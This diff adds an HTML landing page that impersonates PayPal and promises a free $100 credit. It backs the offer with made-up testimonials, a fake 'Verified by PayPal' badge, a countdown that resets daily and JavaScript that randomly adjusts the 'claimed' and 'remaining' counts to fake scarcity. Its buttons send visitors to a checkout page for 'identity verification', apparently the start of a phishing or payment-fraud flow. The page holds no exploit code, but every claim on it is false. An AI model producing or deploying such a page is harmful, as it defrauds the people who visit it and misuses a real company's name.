@@ -1,0 +1,675 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PayPal Free $100 - Limited Time Offer!</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=PayPalSansSmall:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600;700&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'PayPalSansSmall', 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #0070ba 0%, #003087 100%);
+            color: #ffffff;
+            overflow-x: hidden;
+        }
+        
+        /* Header */
+        .header {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            padding: 15px 0;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .header-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .paypal-logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .paypal-logo svg {
+            filter: brightness(0) invert(1);
+        }
+        
+        .paypal-text {
+            font-size: 28px;
+            font-weight: 700;
+            color: #ffffff;
+            letter-spacing: -0.5px;
+        }
+        
+        .timer-badge {
+            background: #ff6b6b;
+            color: white;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-weight: 600;
+            font-size: 14px;
+            animation: pulse 2s infinite;
+        }
+        
+        /* Hero Section */
+        .hero {
+            text-align: center;
+            padding: 80px 20px;
+            max-width: 1000px;
+            margin: 0 auto;
+            position: relative;
+        }
+        
+        .floating-money {
+            position: absolute;
+            font-size: 30px;
+            opacity: 0.3;
+            animation: float 6s ease-in-out infinite;
+        }
+        
+        .floating-money:nth-child(1) { top: 10%; left: 10%; animation-delay: 0s; }
+        .floating-money:nth-child(2) { top: 20%; right: 15%; animation-delay: 1s; }
+        .floating-money:nth-child(3) { bottom: 30%; left: 5%; animation-delay: 2s; }
+        .floating-money:nth-child(4) { bottom: 10%; right: 10%; animation-delay: 3s; }
+        
+        .announcement {
+            background: #ffc439;
+            color: #2c2e2f;
+            padding: 12px 20px;
+            border-radius: 25px;
+            display: inline-block;
+            font-weight: 700;
+            font-size: 16px;
+            margin-bottom: 30px;
+            animation: bounce 2s infinite;
+        }
+        
+        .hero h1 {
+            font-size: 3.5rem;
+            font-weight: 700;
+            margin-bottom: 20px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+            line-height: 1.1;
+        }
+        
+        .amount-highlight {
+            color: #ffc439;
+            font-size: 4rem;
+            display: block;
+            text-shadow: 3px 3px 6px rgba(0, 0, 0, 0.5);
+            margin: 20px 0;
+        }
+        
+        .hero p {
+            font-size: 1.3rem;
+            margin-bottom: 40px;
+            opacity: 0.9;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        
+        .cta-button {
+            background: #ffc439;
+            color: #2c2e2f;
+            padding: 20px 40px;
+            border: none;
+            border-radius: 15px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            box-shadow: 0 8px 25px rgba(255, 196, 57, 0.4);
+            animation: glow 2s ease-in-out infinite alternate;
+            min-width: 320px;
+            white-space: nowrap;
+            line-height: 1.4;
+        }
+        
+        .cta-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 35px rgba(255, 196, 57, 0.6);
+        }
+        
+        /* Features Section */
+        .features {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            padding: 60px 20px;
+            margin: 40px 0;
+        }
+        
+        .features-container {
+            max-width: 1000px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 30px;
+        }
+        
+        .feature {
+            text-align: center;
+            padding: 30px 20px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            transition: all 0.3s ease;
+        }
+        
+        .feature:hover {
+            transform: translateY(-5px);
+            background: rgba(255, 255, 255, 0.2);
+        }
+        
+        .feature i {
+            font-size: 3rem;
+            color: #ffc439;
+            margin-bottom: 20px;
+        }
+        
+        .feature h3 {
+            font-size: 1.3rem;
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+        
+        .feature p {
+            opacity: 0.8;
+            line-height: 1.6;
+        }
+        
+        /* Testimonials */
+        .testimonials {
+            padding: 60px 20px;
+            text-align: center;
+        }
+        
+        .testimonials h2 {
+            font-size: 2.5rem;
+            margin-bottom: 50px;
+            font-weight: 600;
+        }
+        
+        .testimonials-container {
+            max-width: 1000px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+        }
+        
+        .testimonial {
+            background: rgba(255, 255, 255, 0.15);
+            padding: 30px;
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+        }
+        
+        .testimonial-stars {
+            color: #ffc439;
+            font-size: 1.2rem;
+            margin-bottom: 15px;
+        }
+        
+        .testimonial p {
+            font-style: italic;
+            margin-bottom: 15px;
+            line-height: 1.6;
+        }
+        
+        .testimonial-author {
+            font-weight: 600;
+            opacity: 0.9;
+        }
+        
+        /* Urgency Section */
+        .urgency {
+            background: linear-gradient(45deg, #ff6b6b, #ee5a24);
+            padding: 40px 20px;
+            text-align: center;
+            margin: 40px 0;
+        }
+        
+        .urgency h2 {
+            font-size: 2rem;
+            margin-bottom: 20px;
+        }
+        
+        .countdown {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin: 30px 0;
+            flex-wrap: wrap;
+        }
+        
+        .countdown-item {
+            background: rgba(255, 255, 255, 0.2);
+            padding: 15px 20px;
+            border-radius: 10px;
+            min-width: 80px;
+        }
+        
+        .countdown-number {
+            font-size: 2rem;
+            font-weight: 700;
+            display: block;
+        }
+        
+        .countdown-label {
+            font-size: 0.9rem;
+            opacity: 0.8;
+        }
+        
+        /* FAQ Section */
+        .faq {
+            padding: 60px 20px;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        
+        .faq h2 {
+            text-align: center;
+            font-size: 2.5rem;
+            margin-bottom: 50px;
+        }
+        
+        .faq-item {
+            background: rgba(255, 255, 255, 0.1);
+            margin-bottom: 15px;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        
+        .faq-question {
+            padding: 20px;
+            cursor: pointer;
+            font-weight: 600;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .faq-answer {
+            padding: 0 20px 20px;
+            opacity: 0.9;
+            line-height: 1.6;
+        }
+        
+        /* Footer CTA */
+        .footer-cta {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 60px 20px;
+            text-align: center;
+        }
+        
+        .footer-cta h2 {
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+        }
+        
+        .footer-cta p {
+            font-size: 1.2rem;
+            margin-bottom: 30px;
+            opacity: 0.9;
+        }
+        
+        /* Animations */
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+        
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+            40% { transform: translateY(-10px); }
+            60% { transform: translateY(-5px); }
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-20px); }
+        }
+        
+        @keyframes glow {
+            from { box-shadow: 0 8px 25px rgba(255, 196, 57, 0.4); }
+            to { box-shadow: 0 8px 25px rgba(255, 196, 57, 0.8); }
+        }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            .hero h1 { font-size: 2.5rem; }
+            .amount-highlight { font-size: 3rem; }
+            .hero p { font-size: 1.1rem; }
+            .cta-button { 
+                padding: 18px 25px; 
+                font-size: 1rem; 
+                min-width: 280px;
+                border-radius: 12px;
+            }
+            .countdown { gap: 10px; }
+            .countdown-item { min-width: 60px; padding: 10px 15px; }
+            .countdown-number { font-size: 1.5rem; }
+        }
+        
+        /* Security badges */
+        .security-badges {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin-top: 40px;
+            flex-wrap: wrap;
+        }
+        
+        .security-badge {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 10px 15px;
+            border-radius: 25px;
+            font-size: 0.9rem;
+        }
+        
+        .security-badge i {
+            color: #ffc439;
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <div class="header">
+        <div class="header-container">
+            <div class="paypal-logo">
+                <span class="paypal-text">PayPal</span>
+            </div>
+            <div class="timer-badge">
+                <i class="fas fa-clock"></i>
+                Limited Time!
+            </div>
+        </div>
+    </div>
+
+    <!-- Hero Section -->
+    <div class="hero">
+        <div class="floating-money">💰</div>
+        <div class="floating-money">💵</div>
+        <div class="floating-money">💸</div>
+        <div class="floating-money">💳</div>
+        
+        <div class="announcement">
+            🎉 EXCLUSIVE OFFER - PayPal Anniversary Celebration
+        </div>
+        
+        <h1>
+            Get Your FREE
+            <span class="amount-highlight">$100</span>
+            PayPal Credit!
+        </h1>
+        
+        <p>
+            Celebrate PayPal's anniversary with us! We're giving away $100 FREE credit to the first 10,000 users. 
+            No strings attached, no hidden fees. Just free money to spend however you like!
+        </p>
+        
+        <a href="checkout.html" class="cta-button" id="claimBtn">
+            <i class="fas fa-gift"></i>
+            Claim Your $100 Now!
+        </a>
+        
+        <div class="security-badges">
+            <div class="security-badge">
+                <i class="fas fa-shield-alt"></i>
+                SSL Protected
+            </div>
+            <div class="security-badge">
+                <i class="fas fa-users"></i>
+                8,347 Already Claimed
+            </div>
+            <div class="security-badge">
+                <i class="fas fa-clock"></i>
+                1,653 Remaining
+            </div>
+        </div>
+    </div>
+
+    <!-- Features Section -->
+    <div class="features">
+        <div class="features-container">
+            <div class="feature">
+                <i class="fas fa-money-bill-wave"></i>
+                <h3>100% Free Money</h3>
+                <p>No catch, no fees, no subscriptions. Just pure free $100 added to your PayPal account instantly.</p>
+            </div>
+            <div class="feature">
+                <i class="fas fa-bolt"></i>
+                <h3>Instant Delivery</h3>
+                <p>Your $100 credit is added to your account immediately after verification. Start spending right away!</p>
+            </div>
+            <div class="feature">
+                <i class="fas fa-globe"></i>
+                <h3>Use Anywhere</h3>
+                <p>Spend your free $100 at millions of online stores, send to friends, or withdraw to your bank account.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Testimonials -->
+    <div class="testimonials">
+        <h2>What Our Users Say</h2>
+        <div class="testimonials-container">
+            <div class="testimonial">
+                <div class="testimonial-stars">⭐⭐⭐⭐⭐</div>
+                <p>"I couldn't believe it was real! Got my $100 in seconds and already used it to buy Christmas gifts. Thank you PayPal!"</p>
+                <div class="testimonial-author">- Sarah M., New York</div>
+            </div>
+            <div class="testimonial">
+                <div class="testimonial-stars">⭐⭐⭐⭐⭐</div>
+                <p>"Amazing! No hidden fees, no tricks. Just free money. Used it to pay for my groceries this week."</p>
+                <div class="testimonial-author">- Mike R., California</div>
+            </div>
+            <div class="testimonial">
+                <div class="testimonial-stars">⭐⭐⭐⭐⭐</div>
+                <p>"Best promotion ever! Shared with all my friends. PayPal is the best!"</p>
+                <div class="testimonial-author">- Lisa K., Texas</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Urgency Section -->
+    <div class="urgency">
+        <h2>⏰ Hurry! Offer Expires In:</h2>
+        <div class="countdown">
+            <div class="countdown-item">
+                <span class="countdown-number" id="hours">23</span>
+                <span class="countdown-label">Hours</span>
+            </div>
+            <div class="countdown-item">
+                <span class="countdown-number" id="minutes">59</span>
+                <span class="countdown-label">Minutes</span>
+            </div>
+            <div class="countdown-item">
+                <span class="countdown-number" id="seconds">45</span>
+                <span class="countdown-label">Seconds</span>
+            </div>
+        </div>
+        <p>Don't miss out! Only 1,653 spots remaining out of 10,000!</p>
+    </div>
+
+    <!-- FAQ Section -->
+    <div class="faq">
+        <h2>Frequently Asked Questions</h2>
+        <div class="faq-item">
+            <div class="faq-question">
+                Is this really free? <i class="fas fa-chevron-down"></i>
+            </div>
+            <div class="faq-answer">
+                Yes! This is 100% free with no hidden costs, fees, or subscriptions. It's our way of celebrating PayPal's anniversary.
+            </div>
+        </div>
+        <div class="faq-item">
+            <div class="faq-question">
+                How do I claim my $100? <i class="fas fa-chevron-down"></i>
+            </div>
+            <div class="faq-answer">
+                Simply click the "Claim Now" button, complete identity verification (no payment required), and the $100 will be added instantly to your PayPal account.
+            </div>
+        </div>
+        <div class="faq-item">
+            <div class="faq-question">
+                Are there any restrictions? <i class="fas fa-chevron-down"></i>
+            </div>
+            <div class="faq-answer">
+                No restrictions! Use it for shopping, sending to friends, or withdraw to your bank account. It's your money.
+            </div>
+        </div>
+        <div class="faq-item">
+            <div class="faq-question">
+                How long does this offer last? <i class="fas fa-chevron-down"></i>
+            </div>
+            <div class="faq-answer">
+                This is a limited-time offer for the first 10,000 users or until the countdown expires, whichever comes first.
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer CTA -->
+    <div class="footer-cta" id="claim">
+        <h2>Ready to Claim Your $100?</h2>
+        <p>Join thousands of happy PayPal users who have already claimed their free money!</p>
+        <a href="checkout.html" class="cta-button">
+            <i class="fas fa-rocket"></i>
+            Start Claiming Process
+        </a>
+        <div class="security-badges">
+            <div class="security-badge">
+                <i class="fas fa-lock"></i>
+                Bank-Level Security
+            </div>
+            <div class="security-badge">
+                <i class="fas fa-certificate"></i>
+                Verified by PayPal
+            </div>
+            <div class="security-badge">
+                <i class="fas fa-star"></i>
+                Trusted by Millions
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Countdown Timer
+        function updateCountdown() {
+            const now = new Date().getTime();
+            const tomorrow = new Date();
+            tomorrow.setDate(tomorrow.getDate() + 1);
+            tomorrow.setHours(0, 0, 0, 0);
+            const distance = tomorrow.getTime() - now;
+
+            const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+            const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+            const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+
+            document.getElementById('hours').textContent = hours.toString().padStart(2, '0');
+            document.getElementById('minutes').textContent = minutes.toString().padStart(2, '0');
+            document.getElementById('seconds').textContent = seconds.toString().padStart(2, '0');
+        }
+
+        // Update countdown every second
+        setInterval(updateCountdown, 1000);
+        updateCountdown();
+
+        // FAQ Toggle
+        document.querySelectorAll('.faq-question').forEach(question => {
+            question.addEventListener('click', () => {
+                const answer = question.nextElementSibling;
+                const icon = question.querySelector('i');
+                
+                if (answer.style.display === 'block') {
+                    answer.style.display = 'none';
+                    icon.style.transform = 'rotate(0deg)';
+                } else {
+                    answer.style.display = 'block';
+                    icon.style.transform = 'rotate(180deg)';
+                }
+            });
+        });
+
+        // Simulate decreasing spots
+        let spotsRemaining = 1653;
+        setInterval(() => {
+            if (spotsRemaining > 1200) {
+                spotsRemaining -= Math.floor(Math.random() * 3) + 1;
+                document.querySelectorAll('.security-badge').forEach(badge => {
+                    if (badge.textContent.includes('Remaining')) {
+                        badge.innerHTML = `<i class="fas fa-clock"></i>${spotsRemaining.toLocaleString()} Remaining`;
+                    }
+                });
+            }
+        }, 5000);
+
+        // Animate claim button
+        document.getElementById('claimBtn').addEventListener('mouseenter', function() {
+            this.style.transform = 'scale(1.05)';
+        });
+
+        document.getElementById('claimBtn').addEventListener('mouseleave', function() {
+            this.style.transform = 'scale(1)';
+        });
+
+        // Add floating effect to money emojis
+        document.querySelectorAll('.floating-money').forEach((money, index) => {
+            money.style.animationDelay = (index * 1.5) + 's';
+        });
+
+        // Simulate users claiming
+        let usersClaimed = 8347;
+        setInterval(() => {
+            if (usersClaimed < 8500) {
+                usersClaimed += Math.floor(Math.random() * 2) + 1;
+                document.querySelectorAll('.security-badge').forEach(badge => {
+                    if (badge.textContent.includes('Already Claimed')) {
+                        badge.innerHTML = `<i class="fas fa-users"></i>${usersClaimed.toLocaleString()} Already Claimed`;
+                    }
+                });
+            }
+        }, 7000);
+
+        // Page title animation
+        let originalTitle = document.title;
+        let titleIndex = 0;
+        const titleFrames = [
+            "💰 FREE $100 PayPal Credit!",
+            "🎉 Limited Time Offer!",
+            "⏰ Claim Before It's Gone!",
+            originalTitle
+        ];
+
+        setInterval(() => {
+            document.title = titleFrames[titleIndex];
+            titleIndex = (titleIndex + 1) % titleFrames.length;
+        }, 3000);
+    </script>
+</body>
+</html>
